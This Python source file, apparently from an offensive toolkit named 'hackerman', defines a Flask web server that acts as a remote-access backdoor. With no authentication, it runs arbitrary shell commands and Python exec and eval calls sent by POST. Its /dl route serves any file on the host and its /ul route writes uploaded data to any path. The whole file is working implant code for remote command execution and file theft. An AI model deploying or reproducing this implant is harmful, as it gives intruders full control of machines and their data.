from flask import Flask, jsonify, request, send_file
import _thread

from hackerman.utils import sh, cd, b64e, b64d

class Server(object):
    def __init__(self, addr):
        self.addr = addr
    def run(self):
        app = Flask(__name__)
        @app.route("/", methods=['POST'])
        def app_main():
            pl = request.form
            res = self.do_request(pl)
            return jsonify({'res':res})
        @app.route("/dl", methods=['GET'])
        def app_dl():
            fn = request.args['fn']
            return send_file(fn)
        @app.route("/ul", methods=['POST'])
        def app_ul():
            out = request.form['of']
            dat = b64d(request.form['data'])
            with open(out,"wb") as f:
                f.write(dat)
            return "ok"
        
        app.run(host=self.addr[0], port=self.addr[1])
    
    def do_request(self, data):
        if data['bg']:
            new = data
            new['bg'] = False
            _thread.start_new_thread(self.do_request, (new, ))
            return "ok"
        
        if data['type'] == "sh":
            cmd = data['cmd']
            res1 = sh(cmd)
            try:
                res = res1.decode()
            except:
                res = str(res1[2:][:-1])
            return res
        elif data['type'] == "exec":
            cmd = data['cmd']
            try:
                exec(cmd)
                return "ok"
            except Exception as e:
                return "!: "+str(e)
        elif data['type'] == "eval":
            try:
                return eval(data['cmd'])
            except Exception as e:
                return "!: "+str(e)
        
        else:
            return "!: type"